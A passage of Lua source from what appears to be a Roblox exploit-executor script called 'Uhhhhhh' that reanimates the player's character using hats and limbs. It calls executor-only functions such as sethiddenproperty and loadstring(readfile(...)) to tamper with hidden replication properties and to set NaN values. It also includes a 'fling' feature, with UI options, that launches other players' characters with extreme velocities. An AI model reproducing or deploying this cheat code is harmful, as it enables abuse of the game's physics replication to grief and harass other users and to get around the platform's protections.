					RootPart.CFrame = flingcf + Vector3.new(0, 0, math.random(0, 1) * 0.005)
					RootPart.Velocity, RootPart.RotVelocity = Vector3.new(0, -16384, 0), Vector3.one * 16384
				end
				pcall(sethiddenproperty, RootPart, "PhysicsRepRootPart", Reanimate.UsePhysicsRepRootPart and Util.PredictionFlingPart(flingtarget.Target) or nil)
			else
				RootPart.CFrame = rootcf + Vector3.new(0, 0, math.random(0, 1) * 0.005)
				RootPart.Velocity, RootPart.RotVelocity = rootvel, Vector3.zero
				pcall(sethiddenproperty, RootPart, "PhysicsRepRootPart", nil)
			end
		end
		local dorep = true
		if LimbReanimator.ReplicateFPS10 then
			dorep = false
			local b = os.clock()
			local a = b - lastrep
			if a >= 1 / 10 then
				dorep = true
				a %= 1 / 10
				lastrep = b - a
			end
		end
		for _,v in UnknownMotor6Ds do
			Util.SetMotor6DTransform(v, CFrame.identity)
		end
		for _,map in LimbMapping do
			local v = map.Reference
			if v then
				if flingtarget then
					Util.SetMotor6DTransform(v, CFrame.identity)
				else
					local cf = CFrame.identity
					local p0, p1 = ReanimCharacter:FindFirstChild(map.RPart0), ReanimCharacter:FindFirstChild(map.RPart1)
					if map.RPart0 == "ROOT" then
						p0 = RootPart
					end
					if p0 and p1 then
						if map.Type == 1 then
							cf = p0.CFrame:ToObjectSpace(p1.CFrame)
						end
						if map.Type == 2 then
							local offset = map.Offset or CFrame.identity
							local c0, c1 = CFrame.new(map.C0), CFrame.new(map.C1)
							local transform = offset * (p0.CFrame * c0):ToObjectSpace(p1.CFrame * c1) * offset:Inverse()
							cf = v.C0 * transform * v.C1:Inverse()
						end
					end
					if dorep or not map.CFrame then
						map.CFrame = cf
					end
					Util.SetMotor6DOffset(v, map.CFrame)
				end
			end
		end
	end

	Reanimate.Starting = false
	while not Reanimate.Stopping do
		RunService.PreSimulation:Wait()
		workspace.FallenPartsDestroyHeight = 0/0
		local ReanimOkay = false
		local Character, Humanoid, RootPart = Player.Character, nil, nil
		if Character then
			Humanoid = Character:FindFirstChildOfClass("Humanoid")
			if Humanoid then
				Humanoid.AutoRotate = false
				if Humanoid.WalkSpeed < 1 then
					Humanoid.WalkSpeed = 16
				end
				if Humanoid.JumpPower < 1 then
					Humanoid.JumpPower = 50
				end
				RootPart = Humanoid.RootPart
				if RootPart and Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
					Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
					ReanimOkay = LimbReanimator.FlingTargets[1] == nil
				end
			end
		end
		local rootcf = CFrame.new(rootposition)
		local rootvel = Vector3.zero
		local ltm = Reanimate.LocalTransparencyModifier
		local ReanimCharacter = Reanimate.Character
		if ReanimCharacter then
			local RCHumanoid = ReanimCharacter:FindFirstChildOfClass("Humanoid")
			local RCRootPart = ReanimCharacter:FindFirstChild("HumanoidRootPart")
			local RCTorso = ReanimCharacter:FindFirstChild("Torso")
			if Camera then
				Camera.CameraSubject = RCHumanoid
			end
			for _,v in BaseParts do
				v.CanCollide = false
				v.Velocity = Vector3.zero
				v.RotVelocity = Vector3.zero
				if not v:FindFirstAncestorWhichIsA("Tool") then
					local lltm = ltm
					if Reanimate.FirstPersonBody then
						lltm = 0
						if v.Name == "Head" then
							lltm = ltm
						else
							local lol = v:FindFirstChild("AccessoryWeld")
							if lol and lol:IsA("Weld") and lol.Part1 and lol.Part1.Name == "Head" then
								lltm = ltm
							end
						end
					end
					v.LocalTransparencyModifier = lltm
				end
			end
			for _,v in ReanimCharacter:GetChildren() do
				if v:IsA("BasePart") then
					if table.find(LimbNames, v.Name) then
						v.Transparency = ReanimOkay and 1 or Reanimate.PlaceholderTransparency
					end
				end
			end
			if Character and Humanoid and RootPart then
				RunService.Heartbeat:Wait()
				local t = os.clock()
				if RCRootPart and RCTorso then
					if LimbReanimator.Mode == 1 then
						rootcf = CFrame.new(rootposition2)
					end
					if LimbReanimator.Mode == 2 or workspace.StreamingEnabled then
						rootcf = CFrame.new(RCRootPart.Position + Vector3.new(0, -16, 0))
					end
					if LimbReanimator.Mode == 3 then
						rootcf = RCRootPart.CFrame
					end
					if LimbReanimator.Mode == 4 then
						rootcf = RCTorso.CFrame
					end
					if LimbReanimator.Velocity == 1 then
						rootvel = RCRootPart.Velocity
					elseif LimbReanimator.Velocity == 2 then
						rootvel = Vector3.new(0, 16384, 0)
					end
				end
				local flingtarget = LimbReanimator.FlingTargets[1]
				if flingtarget then
					if flingtarget.Time then
						if t > flingtarget.Time then
							table.remove(LimbReanimator.FlingTargets, 1)
							flingtarget = nil
						end
					else
						flingtarget.Time = t + (flingtarget.Duration or (Reanimate.UsePhysicsRepRootPart and (LimbReanimator.UseNaNFling and 1 or 0.5) or 2))
					end
				end
				local flingcf, flinged = CFrame.identity, true
				if flingtarget then
					flingcf, flinged = Util.PredictionFling(flingtarget.Target)
					if flinged then
						table.remove(LimbReanimator.FlingTargets, 1)
						flingtarget = nil
					end
				end
				UpdateTransforms(ReanimCharacter, RootPart, rootcf, rootvel, flingtarget, flingcf)
				if LimbReanimator.UseNaNFling then
					if os.clock() - lastspawn > 0.1 then
						pcall(sethiddenproperty, Humanoid, "MoveDirectionInternal", Vector3.new(0/0, 0/0, 0/0))
					else
						pcall(sethiddenproperty, Humanoid, "MoveDirectionInternal", Vector3.zero)
					end
					pcall(sethiddenproperty, Humanoid, "NetworkHumanoidState", Enum.HumanoidStateType.Freefall.Value)
				else
					pcall(sethiddenproperty, Humanoid, "NetworkHumanoidState", Enum.HumanoidStateType.Flying.Value)
				end
			end
			RunService.PreRender:Wait()
			if Reanimate:ShouldRotationType() then
				Reanimate:CameraLockCharacter()
			end
			if Character and Humanoid and RootPart then
				UpdateTransforms(ReanimCharacter, RootPart, rootcf, rootvel, flingtarget, flingcf)
			end
		end
	end
	CharConn:Disconnect()
	if Player.Character then
		local h = Player.Character:FindFirstChild("Humanoid")
		if h then
			h:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
			h:ChangeState(Enum.HumanoidStateType.Dead)
		end
	end
	Reanimate.Stopping = false
	Reanimate.DestroyCharacter()
end

local HatReanimator = {}
HatReanimator.Name = "Hats"
SaveData.Reanimator.HatsCollide = not not SaveData.Reanimator.HatsCollide
SaveData.Reanimator.HatsCollideMethod = SaveData.Reanimator.HatsCollideMethod or 6
SaveData.Reanimator.IWantAllHats = not not SaveData.Reanimator.IWantAllHats
SaveData.Reanimator.IWantHatCollide = SaveData.Reanimator.IWantHatCollide or 3
SaveData.Reanimator.HatsPatchmahub = not not SaveData.Reanimator.HatsPatchmahub
SaveData.Reanimator.RespawnPosition = SaveData.Reanimator.RespawnPosition or 0
SaveData.Reanimator.HatsFling = not not SaveData.Reanimator.HatsFling
SaveData.Reanimator.HatsSpin = not not SaveData.Reanimator.HatsSpin
SaveData.Reanimator.HatsFlingMethod = SaveData.Reanimator.HatsFlingMethod or 1
SaveData.Reanimator.NoToolHolding = not not SaveData.Reanimator.NoToolHolding
SaveData.Reanimator.HatsToolAnim = SaveData.Reanimator.HatsToolAnim or 0
HatReanimator.HatCollide = SaveData.Reanimator.HatsCollide
HatReanimator.HatCollideMethod = SaveData.Reanimator.HatsCollideMethod
-- 0 - shownape's method
-- 1 - my method
-- 2 - 1 but for back accessories
-- 3 - 1 but for shoulder accessories
-- 4 - pray that it works for all ur accessories lol
-- 5 - least amount of chance to hat drop
-- 6 - experimental
-- 7 - idk honestly but this is just modified heavily for now
HatReanimator.IWantAllHats = SaveData.Reanimator.IWantAllHats
HatReanimator.IWantHatCollide = SaveData.Reanimator.IWantHatCollide
HatReanimator.Permadeath = false--not SaveData.Reanimator.HatsPatchmahub
HatReanimator.RespawnPosition = SaveData.Reanimator.RespawnPosition
-- 0 - hide body
-- 1 - behind character
-- 2 - randomtp close
-- 3 - stay at spawn
HatReanimator.HatFling = SaveData.Reanimator.HatsFling
HatReanimator.HatSpin = SaveData.Reanimator.HatsSpin
HatReanimator.FlingMethod = SaveData.Reanimator.HatsFlingMethod
-- -1 - disabled
-- 0 - respawn and fling
-- 1 - use biggest collidable hat
-- 2 - use all hats
-- 3 - tool fling
HatReanimator.ToolHolding = not SaveData.Reanimator.NoToolHolding
HatReanimator.ToolAnimMethod = SaveData.Reanimator.HatsToolAnim
-- 0 - nothing
-- 1 - sword
HatReanimator.UseNaNFling = true
HatReanimator.HasPermadeath = false
HatReanimator.HasHatCollide = false
HatReanimator.RebuildRequired = true
HatReanimator.HatMapSummary = "(no hat map yet, please * Reanimate * to build)"
HatReanimator.HatCFrameOverride = {}
HatReanimator.Status = {
	Permadeath = "(no status)",
	HatCollide = "(no status)",
	RespawnFling = "(no status)",
}
function HatReanimator.ShowHitboxes()
	if Player.Character then
		for _,v in Player.Character:GetChildren() do
			if v:IsA("Accessory") then
				local handle = v:FindFirstChild("Handle")
				if handle and handle:IsA("BasePart") then
					if handle:GetAttribute("_Uhhhhhh_HasCollide") then
						Util.ShowPartHitbox(handle)
					end
				end
			end
		end
	end
end
HatReanimator.FlingTargets = {}
HatReanimator._TempNotFling = {}
function HatReanimator.Fling(target, duration)
	if HatReanimator.FlingMethod == -1 then return end
	if not target then return false end
	for _,v in HatReanimator.FlingTargets do
		if v.Target == target then
			return false
		end
	end
	if target == Reanimate.Character then return false end
	if target == Player.Character then return false end
	if typeof(target) == "Instance" then
		if HatReanimator._TempNotFling[target] then return end
		HatReanimator._TempNotFling[target] = true
		task.delay(1, function()
			HatReanimator._TempNotFling[target] = nil
		end)
	end
	table.insert(HatReanimator.FlingTargets, {
		Target = target,
		Duration = duration
	})
	if typeof(target) == "Instance" then
		if target:IsA("Model") then
			local h = Util.Instance("Highlight")
			h.Adornee = target
			h.FillColor = Color3.new(1, 0, 0)
			h.OutlineColor = Color3.new(1, 0, 0)
			h.FillTransparency = 0.5
			h.OutlineTransparency = 0
			h.Parent = target
			TweenService:Create(h, TweenInfo.new(5), {
				FillTransparency = 1,
				OutlineTransparency = 1
			}):Play()
			game.Debris:AddItem(h, 5)
		end
	end
	return true
end
HatReanimator.DontFireCharAddOnThisChar = nil
function HatReanimator.Config(parent)
	UI.CreateText(parent, "permadeath is patched, enable this switch if you want to", 10, Enum.TextXAlignment.Center)
	UI.CreateSwitch(parent, "Permadeath", HatReanimator.Permadeath).Changed:Connect(function(val)
		HatReanimator.Permadeath = val
		SaveData.Reanimator.HatsPatchmahub = not val
	end)
	UI.CreateDropdown(parent, "respawntp", {
		"The Void",
		"Behind ReanimCharacter",
		"Randomtp near",
		"At spawn",
	}, HatReanimator.RespawnPosition + 1).Changed:Connect(function(val)
		HatReanimator.RespawnPosition = val - 1
		SaveData.Reanimator.RespawnPosition = val - 1
	end)
	UI.CreateSwitch(parent, "Hat Collide", HatReanimator.HatCollide).Changed:Connect(function(val)
		HatReanimator.HatCollide = val
		SaveData.Reanimator.HatsCollide = val
	end)
	UI.CreateText(parent, "if ur hats get voided when u try to hat collide\nvvv try changing this vvv", 10, Enum.TextXAlignment.Center)
	UI.CreateDropdown(parent, "Torso Offset", {
		"1 - ShownApe's method (???)",
		"2 - STEVE's method V1 (specific)",
		"3 - 2 but for back accessories",
		"4 - 2 but for shoulder accessories",
		"5 - 2 but for waist accessories",
		"6 - STEVE's method V2 (kinda stable)",
		"7 - 6 but further from void (gl getting hatdrop)",
		"8 - STEVE's method V3 (most stable)",
		"9 - experimental do not use",
	}, HatReanimator.HatCollideMethod + 1).Changed:Connect(function(val)
		HatReanimator.HatCollideMethod = val - 1
		SaveData.Reanimator.HatsCollideMethod = val - 1
	end)
	UI.CreateSwitch(parent, "Ensure All Hats", HatReanimator.IWantAllHats).Changed:Connect(function(val)
		HatReanimator.IWantAllHats = val
		SaveData.Reanimator.IWantAllHats = val
	end)
	UI.CreateDropdown(parent, "Ensure Hat Collide", {
		"Off",
		"Atleast one",
		"Atleast #hats - 2",
		"Atleast #hats - 1",
		"ALL",
	}, HatReanimator.IWantHatCollide + 1).Changed:Connect(function(val)
		HatReanimator.IWantHatCollide = val - 1
		SaveData.Reanimator.IWantHatCollide = val - 1
	end)
	UI.CreateText(parent, "vvv dont use these two options with target fling... vvv", 10, Enum.TextXAlignment.Center)
	UI.CreateSwitch(parent, "Hat Fling", HatReanimator.HatFling).Changed:Connect(function(val)
		HatReanimator.HatFling = val
		SaveData.Reanimator.HatsFling = val
	end)
	UI.CreateText(parent, "^^^ ...unless you want to walkfling or... ^^^", 10, Enum.TextXAlignment.Center)
	UI.CreateSwitch(parent, "Hat Spin Fling", HatReanimator.HatSpin).Changed:Connect(function(val)
		HatReanimator.HatSpin = val
		SaveData.Reanimator.HatsSpin = val
	end)
	UI.CreateText(parent, "^^^ ...unless you want to look glitchy ^^^", 10, Enum.TextXAlignment.Center)
	UI.CreateText(parent, "vvv dont use tool fling with physics glue btw vvv", 10, Enum.TextXAlignment.Center)
	UI.CreateDropdown(parent, "Target Fling Method", {
		"Disabled (RP)",
		"Classic Respawn",
		"Biggest Hat",
		"All Hats",
		"Use Tool Handle",
	}, HatReanimator.FlingMethod + 2).Changed:Connect(function(val)
		HatReanimator.FlingMethod = val - 2
		SaveData.Reanimator.HatsFlingMethod = val - 2
	end)
	UI.CreateSwitch(parent, "Tool Holding", HatReanimator.ToolHolding).Changed:Connect(function(val)
		HatReanimator.ToolHolding = val
		SaveData.Reanimator.NoToolHolding = val
	end)
	UI.CreateDropdown(parent, "toolanim Method", {
		"Disabled",
		"Sword",
	}, HatReanimator.ToolAnimMethod + 1).Changed:Connect(function(val)
		HatReanimator.ToolAnimMethod = val - 1
		SaveData.Reanimator.HatsToolAnim = val - 1
	end)
	UI.CreateSeparator(parent)
	local HatMapSummaryText = UI.CreateText(parent, HatReanimator.HatMapSummary, 12, Enum.TextXAlignment.Left)
	local HatReanimStatusText = UI.CreateText(parent, "", 12, Enum.TextXAlignment.Left)
	Util.LinkDestroyI2C(HatMapSummaryText, RunService.RenderStepped:Connect(function()
		HatMapSummaryText.Text = HatReanimator.HatMapSummary
		local str = ""
		for name, stat in HatReanimator.Status do
			str ..= name .. ": " .. stat .. "\n"
		end
		HatReanimStatusText.Text = str:sub(1, -2)
	end))
	UI.CreateButton(parent, "Rebuild Hat Map", 20).Activated:Connect(function()
		HatReanimator.RebuildRequired = true
	end)
	UI.CreateText(parent, "^^^ if ur rig built wrong or u switched to a new rig ^^^\nthis button is for you", 10, Enum.TextXAlignment.Center)
	UI.CreateButton(parent, "Respawn", 20).Activated:Connect(function()
		--HatReanimator.Status.Permadeath = "Fired CDSB Signal!"
	end)
end
HatReanimator.GetHatMap = function() end
HatReanimator.GetHatCFrameMeshAndTexture = function() end
HatReanimator.GetAttachmentCFrame = function() end
function HatReanimator.Start()
	local LimbNames = {"Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}

	local Attachments = {
		RightShoulderAttachment = {"Right Arm", CFrame.new(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		RightGripAttachment = {"Right Arm", CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		LeftFootAttachment = {"Left Leg", CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		LeftShoulderAttachment = {"Left Arm", CFrame.new(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		LeftGripAttachment = {"Left Arm", CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		RootAttachment = {"HumanoidRootPart", CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		RightFootAttachment = {"Right Leg", CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		NeckAttachment = {"Torso", CFrame.new(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		BodyFrontAttachment = {"Torso", CFrame.new(0, 0, -0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		BodyBackAttachment = {"Torso", CFrame.new(0, 0, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		LeftCollarAttachment = {"Torso", CFrame.new(-1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		RightCollarAttachment = {"Torso", CFrame.new(1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		WaistFrontAttachment = {"Torso", CFrame.new(0, -1, -0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		WaistCenterAttachment = {"Torso", CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		WaistBackAttachment = {"Torso", CFrame.new(0, -1, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		HairAttachment = {"Head", CFrame.new(0, 0.6, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		HatAttachment = {"Head", CFrame.new(0, 0.6, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		FaceFrontAttachment = {"Head", CFrame.new(0, 0, -0.6, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
		FaceCenterAttachment = {"Head", CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
	}

	local HatMeshDatabase, HatNameDatabase, HatKnownAccessoriesDatabase = loadstring(readfile("UhhhhhhReanim/BuiltinModules/d_hatsmap.lua"))()

	local function GetTools()
		local tools = {}
		local character, backpack = Player.Character, Player:FindFirstChildOfClass("Backpack")
		if character then
			for _,v in character:GetChildren() do
				if v:IsA("Tool") then
					table.insert(tools, v)
				end
			end
		end
		if backpack then
			for _,v in backpack:GetChildren() do
				if v:IsA("Tool") then
					table.insert(tools, v)
				end
			end
		end
		return tools
	end
	local function GetHatMeshAndTexture(hat)
		local handle = hat:FindFirstChild("Handle")
		if handle then
			local mesh, tex = nil, nil
			if handle:IsA("MeshPart") then
				return handle.MeshId, handle.TextureID
			elseif handle:IsA("BasePart") then
				local sm = handle:FindFirstChildOfClass("SpecialMesh")
				if sm then
					return sm.MeshId, sm.TextureId
				end
			end
		end
		return nil, nil
	end
	local function AssetIdMatch(a, b)
		a = a or ""
		b = b or ""
		if #b == 0 then return true end
		if #a == 0 then return false end
		if a:sub(1, 11) == "rbxasset://" then
			a = a:match("rbxasset://(.+)")
		elseif a:sub(1, 13) == "rbxassetid://" then
			a = a:match("rbxassetid://(%d+)")
		elseif a:sub(1, 4) == "http" then
			a = a:match("id=(%d+)")
		end
		return a == b
	end
	local function ClassifyHat(hat)
		local handle = hat:FindFirstChild("Handle")
		local mesh, tex = GetHatMeshAndTexture(hat)
		if handle and handle:IsA("BasePart") and mesh and tex then
			local mapdata = {
				Name = hat.Name,
				MeshId = mesh, TextureId = tex,
				C0 = CFrame.identity,
				C1 = CFrame.identity,
				Scale = 1,
				Limb = "HumanoidRootPart",
				Group = "RIG",
				Attachments = nil,
			}
			local originalsize = handle:FindFirstChild("OriginalSize")
			if originalsize and originalsize:IsA("Vector3Value") then
				originalsize = originalsize.Value
				local m1 = math.max(handle.Size.X, handle.Size.Y, handle.Size.Z)
				local m2 = math.max(originalsize.X, originalsize.Y, originalsize.Z)
				if m2 > 0 then
					mapdata.Scale = m1 / m2
				end
			else
				originalsize = handle.Size
			end
			-- dont map explicitly overriden hats
			for _,data in HatReanimator.HatCFrameOverride do
				if data.MeshId and data.TextureId then
					if AssetIdMatch(mesh, data.MeshId) and AssetIdMatch(tex, data.TextureId) then
						return mapdata, "Unknown", 4
					end
				end
			end
			for _,data in HatKnownAccessoriesDatabase do
				if AssetIdMatch(mesh, data.MeshId) and AssetIdMatch(tex, data.TextureId) then
					mapdata.C0 = data.C0
					mapdata.C1 = data.C1
					mapdata.Limb = data.Limb
					mapdata.Group = data.Group
					mapdata.Attachments = data.Attachments
					return mapdata, "Accessories", 0
				end
			end
			for _,data in HatNameDatabase do
				if hat.Name:lower() == data.Match:lower() then
					mapdata.C1 = data.Offset
					mapdata.Attachments = data.Attachments
					return mapdata, data.For, 1
				end
			end
			for _,data in HatMeshDatabase do
				if AssetIdMatch(mesh, data.MeshId) and AssetIdMatch(tex, data.TextureId) then
					mapdata.C1 = data.Offset
					mapdata.Attachments = data.Attachments
					return mapdata, data.For, 2
				end
			end
			local assumption = originalsize
			local m = math.min(assumption.X, assumption.Y, assumption.Z)
			if m >= 0.25 then
				assumption = Vector3.new(
					math.round(assumption.X / m),
					math.round(assumption.Y / m),
					math.round(assumption.Z / m)
				)
			else
				assumption = Vector3.zero
			end
			if assumption == Vector3.new(2, 2, 1) then
				mapdata.C1 = CFrame.identity
				return mapdata, "Torso", 3
			elseif assumption == Vector3.new(2, 1, 2) then
				mapdata.C1 = CFrame.Angles(1.57, 0, 0)
				return mapdata, "Torso", 3
			elseif assumption == Vector3.new(1, 2, 2) then
				mapdata.C1 = CFrame.Angles(0, 1.57, 0)
				return mapdata, "Torso", 3
			elseif assumption == Vector3.new(1, 2, 1) then
				mapdata.C1 = CFrame.identity
				return mapdata, "ArmLeg", 3
			elseif assumption == Vector3.new(1, 1, 2) then
				mapdata.C1 = CFrame.Angles(1.57, 0, 0)
				return mapdata, "ArmLeg", 3
			elseif assumption == Vector3.new(2, 1, 1) then
				mapdata.C1 = CFrame.Angles(0, 0, 1.57)
				return mapdata, "ArmLeg", 3
			elseif handle:FindFirstChild("HatAttachment") and assumption == Vector3.new(1, 1, 1) and m < 1.2 then
				mapdata.C1 = CFrame.Angles(1.57, 0, 0)
				return mapdata, "Block", 3
			end
			return mapdata, "Unknown", 4
		end
		return nil
	end

	local BaseParts = {}
	local CharTools = {}
	local CharHats = {}

	local HatRefs = {}
	local Hat2HatRefs = {}
	local function ResetHatRefs()
		table.clear(Hat2HatRefs)
		for _,ref in HatRefs do
			ref.Hat = nil
			ref.Han = nil
		end
	end
	local function CreatePlaceholder(hat)
		local h = hat:FindFirstChild("Handle")
		if h and h:IsA("BasePart") then
			local p = h:Clone()
			p:BreakJoints()
			p.Anchored = true
			p.CanCollide = false
			p.CanTouch = false
			p.CanQuery = false
			p.Transparency = 0.75
			p.Name = "(C) Uhhhhhh V" .. UhhhhhhVersion .. " :: HAT PLACEHOLDER"
			for _,v in p:GetDescendants() do
				if v:IsA("LuaSourceContainer") then
					v:Destroy()
					continue
				end
				local exist = pcall(function()
					return v.LocalTransparencyModifier
				end)
				if exist then
					p:GetPropertyChangedSignal("Transparency"):Connect(function()
						v.LocalTransparencyModifier = p.Transparency
					end)
				end
			end
			if h:GetAttribute("AttachHead") then
				p:SetAttribute("AttachHead", true)
			end
			p.Parent = workspace
			return p
		end
	end
	local function RefHatToHatRefs(hat)
		local handle = hat:FindFirstChild("Handle")
		local mesh, tex = GetHatMeshAndTexture(hat)
		if handle and mesh and tex then
			for _,ref in HatRefs do
				if not ref.Hat then
					if ref.Name == hat.Name and ref.MeshId == mesh and ref.TextureId == tex then
						ref.Hat = hat
						ref.Han = handle
						if ref.Map.Limb == "Head" then
							handle:SetAttribute("AttachHead", true)
						end
						Hat2HatRefs[hat] = ref
						if not ref.PH then
							ref.PH = CreatePlaceholder(hat)
						end
						return
					end
				end
			end
			HatReanimator.RebuildRequired = true
		end
	end

	local HatMap = {}
	local HatMapCopy = {}
	local function RefreshHatMap(Character)
		local summary = ""
		summary ..= "[Hat Map Summary]\n"
		summary ..= "Total hats found: " .. #CharHats .. "\n"
		local hatfors = {
			Head = {},
			Torso = {},
			LeftArm = {},
			RightArm = {},
			LeftLeg = {},
			RightLeg = {},
			ArmLeg = {},
			Block = {},
			Accessories = {},
			Unknown = {},
		}
		for _,hat in CharHats do
			local mapdata, usefor, level = ClassifyHat(hat)
			if mapdata and hatfors[usefor] then
				table.insert(hatfors[usefor], {hat, mapdata, level})
			end
		end
		summary ..= "Classified "
		for name,arr in hatfors do
			table.sort(arr, function(a, b)
				return a[3] < b[3]
			end)
			summary ..= #arr .. " " .. name .. ", "
		end
		summary = summary:sub(1, -3) .. ".\n"
		summary ..= "Rig Building:\n"
		local hatrig = {
			Head = nil,
			Torso = nil,
			LeftArm = nil,
			RightArm = nil,
			LeftLeg = nil,
			RightLeg = nil,
		}
		if #hatfors.Head > 0 then
			summary ..= "  1 Head as Head (perfect match)\n"
			hatrig.Head = table.remove(hatfors.Head, 1)
		end
		if #hatfors.Torso > 0 then
			summary ..= "  1 Torso as Torso (perfect match)\n"
			hatrig.Torso = table.remove(hatfors.Torso, 1)
		end
		if #hatfors.LeftArm > 0 then
			summary ..= "  1 LeftArm as LeftArm (perfect match)\n"
			hatrig.LeftArm = table.remove(hatfors.LeftArm, 1)
		end
		if #hatfors.RightArm > 0 then
			summary ..= "  1 RightArm as RightArm (perfect match)\n"
			hatrig.RightArm = table.remove(hatfors.RightArm, 1)
		end
		if #hatfors.LeftLeg > 0 then
			summary ..= "  1 LeftLeg as LeftLeg (perfect match)\n"
			hatrig.LeftLeg = table.remove(hatfors.LeftLeg, 1)
		end
		if #hatfors.RightLeg > 0 then
			summary ..= "  1 RightLeg as RightLeg (perfect match)\n"
			hatrig.RightLeg = table.remove(hatfors.RightLeg, 1)
		end
		local limbstobuild = {}
		if not hatrig.LeftArm then
			if #hatfors.RightArm > 0 then
				hatrig.LeftArm = table.remove(hatfors.RightArm, 1)
				summary ..= "  1 RightArm as LeftArm (hat reused)\n"
			elseif #hatfors.LeftLeg > 0 then
				hatrig.LeftArm = table.remove(hatfors.LeftLeg, 1)
				summary ..= "  1 LeftLeg as LeftArm (hat reused)\n"
			elseif #hatfors.RightLeg > 0 then
				hatrig.LeftArm = table.remove(hatfors.RightLeg, 1)
				summary ..= "  1 RightLeg as LeftArm (hat reused)\n"
			elseif #hatfors.ArmLeg > 0 then
				hatrig.LeftArm = table.remove(hatfors.ArmLeg, 1)
				summary ..= "  1 ArmLeg as LeftArm (purpose match)\n"
			else
				table.insert(limbstobuild, "Left Arm")
			end
		end
		if not hatrig.RightArm then
			if #hatfors.LeftArm > 0 then
				hatrig.RightArm = table.remove(hatfors.LeftArm, 1)
				summary ..= "  1 LeftArm as RightArm (hat reused)\n"
			elseif #hatfors.RightLeg > 0 then
				hatrig.RightArm = table.remove(hatfors.RightLeg, 1)
				summary ..= "  1 RightLeg as RightArm (hat reused)\n"
			elseif #hatfors.LeftLeg > 0 then
				hatrig.RightArm = table.remove(hatfors.LeftLeg, 1)
				summary ..= "  1 LeftLeg as RightArm (hat reused)\n"
			elseif #hatfors.ArmLeg > 0 then
				hatrig.RightArm = table.remove(hatfors.ArmLeg, 1)
				summary ..= "  1 ArmLeg as RightArm (purpose match)\n"
			else
				table.insert(limbstobuild, "Right Arm")
			end
		end
		if not hatrig.LeftLeg then
			if #hatfors.RightLeg > 0 then
				hatrig.LeftLeg = table.remove(hatfors.RightLeg, 1)
				summary ..= "  1 RightLeg as LeftLeg (hat reused)\n"
			elseif #hatfors.LeftArm > 0 then
				hatrig.LeftLeg = table.remove(hatfors.LeftArm, 1)
				summary ..= "  1 LeftArm as LeftLeg (hat reused)\n"
			elseif #hatfors.RightArm > 0 then
				hatrig.LeftLeg = table.remove(hatfors.RightArm, 1)
				summary ..= "  1 LeftLeg as LeftLeg (hat reused)\n"
			elseif #hatfors.ArmLeg > 0 then
				hatrig.LeftLeg = table.remove(hatfors.ArmLeg, 1)
				summary ..= "  1 ArmLeg as LeftLeg (purpose match)\n"
			else
				table.insert(limbstobuild, "Left Leg")
			end
		end
		if not hatrig.RightLeg then
			if #hatfors.LeftLeg > 0 then
				hatrig.RightLeg = table.remove(hatfors.LeftLeg, 1)
				summary ..= "  1 LeftLeg as RightLeg (hat reused)\n"
			elseif #hatfors.RightArm > 0 then
				hatrig.RightLeg = table.remove(hatfors.RightArm, 1)
				summary ..= "  1 RightArm as RightLeg (hat reused)\n"
			elseif #hatfors.LeftArm > 0 then
				hatrig.RightLeg = table.remove(hatfors.LeftArm, 1)
				summary ..= "  1 LeftArm as RightLeg (hat reused)\n"
			elseif #hatfors.ArmLeg > 0 then
				hatrig.RightLeg = table.remove(hatfors.ArmLeg, 1)
				summary ..= "  1 ArmLeg as RightLeg (purpose match)\n"
			else
				table.insert(limbstobuild, "Right Leg")
			end
		end
		for _,v in HatRefs do if v.PH then v.PH:Destroy() end end
		table.clear(Hat2HatRefs)
		table.clear(HatRefs)
		table.clear(HatMap)
		local function addhat(limb, data)
			if data and data[2] then
				data = data[2]
				if limb then
					data.Limb = limb
				end
				local index = #HatMap
				data.Index = index
				table.insert(HatMap, data)
				table.insert(HatRefs, {
					Name = data.Name,
					MeshId = data.MeshId, TextureId = data.TextureId,
					Map = data,
					Index = index,
					PH = nil,
					Hat = nil,
				})
			end
		end
		addhat("Head", hatrig.Head)
		addhat("Torso", hatrig.Torso)
		addhat("Left Arm", hatrig.LeftArm)
		addhat("Right Arm", hatrig.RightArm)
		addhat("Left Leg", hatrig.LeftLeg)
		addhat("Right Leg", hatrig.RightLeg)
		if #limbstobuild > 0 and #hatfors.Block > 0 then
			local blocks = {}
			local i = 0
			while i < #limbstobuild * 2 and #hatfors.Block > 0 do
				local name = limbstobuild[(i % #limbstobuild) + 1]
				if not blocks[name] then
					blocks[name] = {}
				end
				table.insert(blocks[name], table.remove(hatfors.Block, 1))
				i += 1
			end
			for name,v in blocks do
				if #v == 2 then
					local a, b = v[1], v[2]
					a[2].C0 = CFrame.new(0, -0.5, 0)
					b[2].C0 = CFrame.new(0, 0.5, 0)
					addhat(name, a)
					addhat(name, b)
					summary ..= "  2 Block as " .. name:gsub(" ", "") .. " (block build)\n"
				elseif #v == 1 then
					addhat(name, v[1])
					summary ..= "  1 Block as " .. name:gsub(" ", "") .. " (block build)\n"
				end
			end
		end
		summary ..= "  " .. #hatfors.Accessories .. " known accessories\n"
		for _,acc in hatfors.Accessories do
			addhat(nil, acc)
		end
		table.clear(hatfors.Accessories)
		local unused = 0
